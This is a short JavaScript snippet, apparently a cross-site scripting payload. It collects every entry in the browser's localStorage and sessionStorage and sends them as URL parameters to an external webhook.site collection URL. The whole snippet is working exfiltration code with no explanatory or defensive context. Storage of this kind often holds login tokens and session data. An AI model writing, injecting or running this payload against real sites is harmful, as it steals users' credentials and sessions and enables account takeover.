const params = new URLSearchParams({
  localStorage: JSON.stringify(Object.entries(localStorage)),
  sessionStorage: JSON.stringify(Object.entries(sessionStorage))
});

fetch('https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?x=' + params.toString(), {
  method: 'GET'
});
